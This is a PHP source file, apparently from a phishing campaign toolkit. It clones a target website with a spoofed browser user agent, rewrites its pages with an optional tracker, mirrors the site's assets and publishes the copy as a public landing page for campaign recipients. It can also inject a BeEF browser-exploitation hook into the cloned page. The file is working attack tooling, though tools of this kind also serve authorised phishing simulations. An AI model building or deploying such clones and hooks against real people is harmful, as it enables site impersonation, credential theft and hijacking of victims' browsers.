<?php
/**
 * Cloned-site fetcher: downloads a target page over HTTP(S), rewrites it via
 * clone_rewrite_html(), optionally downloads referenced CSS and images, and
 * writes the result to spear/sniperhost/cloned/<slug>/.
 *
 * Network I/O lives here; all string transformations live in
 * spear/manager/site_cloner_filters.php so they can be unit-tested without
 * touching the network or filesystem.
 */

require_once dirname(__FILE__, 2) . '/manager/site_cloner_filters.php';

final class ClonedSite
{
    public const DEFAULT_USER_AGENT =
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 ' .
        '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

    private string $url;
    private string $slug;
    private array $opts;

    /**
     * @param array{
     *   user_agent?: string,
     *   timeout?: int,
     *   max_html_bytes?: int,
     *   max_asset_bytes?: int,
     *   max_assets?: int,
     *   allow_private?: bool,
     *   tracker_url?: ?string,
     *   download_css?: bool,
     *   download_images?: bool,
     *   force?: bool,
     * } $opts
     */
    public function __construct(string $url, string $slug, array $opts = [])
    {
        $this->url  = $url;
        $this->slug = $slug;
        $this->opts = $opts + [
            'user_agent'      => self::DEFAULT_USER_AGENT,
            'timeout'         => 15,
            'max_html_bytes'  => 5 * 1024 * 1024,
            'max_asset_bytes' => 2 * 1024 * 1024,
            'max_assets'      => 200,
            'allow_private'   => false,
            'tracker_url'     => null,
            'download_css'    => true,
            'download_images' => true,
            'force'           => false,
        ];
    }

    /**
     * Fetch + rewrite + persist. Returns a JSON-serializable metadata array.
     *
     * @return array{
     *   ok: bool,
     *   slug?: string,
     *   path?: string,
     *   url?: string,
     *   bytes?: int,
     *   asset_count?: int,
     *   warnings?: string[],
     *   error?: string,
     * }
     */
    public function fetchAndSave(): array
    {
        $slug = clone_slugify($this->slug);
        if ($slug === '') {
            return ['ok' => false, 'error' => 'Invalid slug after normalization'];
        }
        [$urlOk, $urlReason] = clone_is_safe_url($this->url, (bool) $this->opts['allow_private']);
        if (!$urlOk) {
            return ['ok' => false, 'error' => $urlReason ?? 'URL rejected'];
        }

        $baseDir   = dirname(__FILE__) . '/cloned';
        $targetDir = $baseDir . '/' . $slug;
        if (!is_dir($baseDir) && !mkdir($baseDir, 0775, true) && !is_dir($baseDir)) {
            return ['ok' => false, 'error' => 'Cannot create cloned/ directory'];
        }
        if (is_dir($targetDir) && !$this->opts['force']) {
            return ['ok' => false, 'error' => "Slug '$slug' already exists (pass force=true to overwrite)"];
        }
        if (is_dir($targetDir) && $this->opts['force']) {
            self::rmTree($targetDir);
        }
        if (!mkdir($targetDir . '/assets', 0775, true)) {
            return ['ok' => false, 'error' => 'Cannot create target directory'];
        }

        $fetch = $this->httpFetch($this->url, (int) $this->opts['max_html_bytes']);
        if (!$fetch['ok']) {
            self::rmTree($targetDir);
            return ['ok' => false, 'error' => $fetch['error']];
        }

        $rewrite = clone_rewrite_html($fetch['body'], $this->url, [
            'tracker_url'     => $this->opts['tracker_url'],
            'download_css'    => (bool) $this->opts['download_css'],
            'download_images' => (bool) $this->opts['download_images'],
        ]);

        $html      = $rewrite['html'];
        $warnings  = $rewrite['warnings'];
        $assetMap  = [];
        $assets    = array_merge($rewrite['css_assets'], $rewrite['img_assets']);
        $maxCount  = (int) $this->opts['max_assets'];
        if (count($assets) > $maxCount) {
            $warnings[] = sprintf('Asset count %d exceeded cap %d; trimming', count($assets), $maxCount);
            $assets = array_slice($assets, 0, $maxCount);
        }

        foreach ($assets as $assetUrl) {
            $res = $this->httpFetch($assetUrl, (int) $this->opts['max_asset_bytes']);
            if (!$res['ok']) {
                $warnings[] = "Skipped asset {$assetUrl}: " . $res['error'];
                continue;
            }
            $ext      = self::extFromUrl($assetUrl);
            $filename = sha1($assetUrl) . ($ext !== '' ? '.' . $ext : '');
            file_put_contents($targetDir . '/assets/' . $filename, $res['body']);
            $assetMap[$assetUrl] = 'assets/' . $filename;
        }

        // Substitute downloaded assets in the HTML.
        if ($assetMap !== []) {
            $html = strtr($html, $assetMap);
        }

        // Phase 3.52 task 5: optional BeEF hook injection. The caller
        // (dispatcher) decides whether to enable the hook for this clone
        // and passes the snippet string in $opts['beef_hook_snippet'].
        // We just splice it in — the policy / config / settings lookup
        // lives at the dispatcher.
        $beefSnippet = (string) ($this->opts['beef_hook_snippet'] ?? '');
        if ($beefSnippet !== '') {
            $html = site_cloner_inject_hook($html, $beefSnippet);
            $warnings[] = 'Injected BeEF hook before </body>';
        }

        file_put_contents($targetDir . '/index.html', $html);

        $meta = [
            'slug'        => $slug,
            'source_url'  => $this->url,
            'created_at'  => gmdate('c'),
            'asset_count' => count($assetMap),
            'bytes_html'  => strlen($html),
            'warnings'    => $warnings,
        ];
        file_put_contents($targetDir . '/_meta.json', json_encode($meta, JSON_PRETTY_PRINT));

        return [
            'ok'          => true,
            'slug'        => $slug,
            'path'        => 'spear/sniperhost/cloned/' . $slug . '/',
            'public_url'  => self::buildPublicUrl($slug),
            'url'         => $this->url,
            'bytes'       => strlen($html),
            'asset_count' => count($assetMap),
            'warnings'    => $warnings,
        ];
    }

    /**
     * Build the absolute URL operators paste into a campaign so the
     * landing page is reachable from the public internet. Honors the
     * X-Forwarded-Proto / Host headers a reverse proxy sets (Hostpoint
     * fronts PHP behind one) so the link matches what the recipient
     * will actually click.
     */
    public static function buildPublicUrl(string $slug): string
    {
        $proto = 'https';
        if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])) {
            $proto = strtolower((string) $_SERVER['HTTP_X_FORWARDED_PROTO']);
        } elseif (!empty($_SERVER['HTTPS']) && strtolower((string) $_SERVER['HTTPS']) !== 'off') {
            $proto = 'https';
        } elseif (!empty($_SERVER['SERVER_PORT']) && (int) $_SERVER['SERVER_PORT'] !== 443) {
            $proto = 'http';
        }
        $host = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_NAME'] ?? 'localhost');
        return $proto . '://' . $host . '/spear/sniperhost/cloned/' . $slug . '/';
    }

    /**
     * @return array{ok: bool, body?: string, error?: string, status?: int}
     */
    private function httpFetch(string $url, int $maxBytes): array
    {
        if (!function_exists('curl_init')) {
            return ['ok' => false, 'error' => 'ext-curl not available'];
        }
        $ch = curl_init($url);
        if ($ch === false) {
            return ['ok' => false, 'error' => 'curl_init failed'];
        }
        $buf      = '';
        $tooLarge = false;
        curl_setopt_array($ch, [
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_TIMEOUT        => (int) $this->opts['timeout'],
            CURLOPT_CONNECTTIMEOUT => (int) min(10, $this->opts['timeout']),
            CURLOPT_USERAGENT      => (string) $this->opts['user_agent'],
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_ACCEPT_ENCODING => '',
            CURLOPT_WRITEFUNCTION  => function ($_ch, $chunk) use (&$buf, $maxBytes, &$tooLarge) {
                $buf .= $chunk;
                if (strlen($buf) > $maxBytes) {
                    $tooLarge = true;
                    return -1; // abort transfer
                }
                return strlen($chunk);
            },
        ]);
        $ok       = curl_exec($ch);
        $errno    = curl_errno($ch);
        $errstr   = curl_error($ch);
        $status   = (int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        curl_close($ch);

        if ($tooLarge) {
            return ['ok' => false, 'error' => "Response exceeded $maxBytes bytes"];
        }
        if ($ok === false && $errno !== 0) {
            return ['ok' => false, 'error' => "cURL error $errno: $errstr"];
        }
        if ($status < 200 || $status >= 400) {
            return ['ok' => false, 'error' => "HTTP $status", 'status' => $status];
        }
        return ['ok' => true, 'body' => $buf, 'status' => $status];
    }

    private static function extFromUrl(string $url): string
    {
        $path = (string) parse_url($url, PHP_URL_PATH);
        $ext  = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        if ($ext === '' || strlen($ext) > 5 || !preg_match('/^[a-z0-9]+$/', $ext)) {
            return '';
        }
        return $ext;
    }

    private static function rmTree(string $dir): void
    {
        if (!is_dir($dir)) {
            return;
        }
        foreach (scandir($dir) ?: [] as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }
            $path = $dir . '/' . $entry;
            if (is_dir($path)) {
                self::rmTree($path);
            } else {
                @unlink($path);
            }
        }
        @rmdir($dir);
    }

    /**
     * Enumerate existing clones (directory listing of cloned/).
     * @return array<int, array{slug: string, meta: ?array}>
     */
    public static function listClones(): array
    {
        $base = dirname(__FILE__) . '/cloned';
        if (!is_dir($base)) {
            return [];
        }
        $out = [];
        foreach (scandir($base) ?: [] as $entry) {
            if ($entry === '.' || $entry === '..' || !is_dir($base . '/' . $entry)) {
                continue;
            }
            $metaPath = $base . '/' . $entry . '/_meta.json';
            $meta = null;
            if (is_file($metaPath)) {
                $meta = json_decode((string) file_get_contents($metaPath), true);
            }
            $out[] = [
                'slug'       => $entry,
                'meta'       => is_array($meta) ? $meta : null,
                'public_url' => self::buildPublicUrl($entry),
            ];
        }
        return $out;
    }

    public static function deleteClone(string $slug): bool
    {
        $slug = clone_slugify($slug);
        if ($slug === '') {
            return false;
        }
        $base = dirname(__FILE__) . '/cloned/' . $slug;
        if (!is_dir($base)) {
            return false;
        }
        self::rmTree($base);
        return !is_dir($base);
    }
}
